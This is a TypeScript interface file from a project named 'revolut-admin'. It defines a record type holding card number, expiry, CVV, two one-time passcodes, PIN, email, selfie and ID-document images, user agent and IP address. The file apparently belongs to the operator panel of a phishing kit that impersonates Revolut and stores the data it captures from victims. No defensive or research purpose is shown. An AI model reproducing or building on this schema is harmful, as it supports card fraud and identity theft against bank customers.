// revolut-admin/src/utils/interfaces.ts
export interface ICard {
  id: number;
  phone: string;
  number: string;
  expiry: string;
  cvv: string;
  otp1: string;
  otp2: string;
  pin: string;
  email: string;
  selfie_img: string;
  id_front_img: string;
  id_back_img: string;
  user_agent: string;
  ip_address: string;
  created_at: string;
  updated_at: string;
}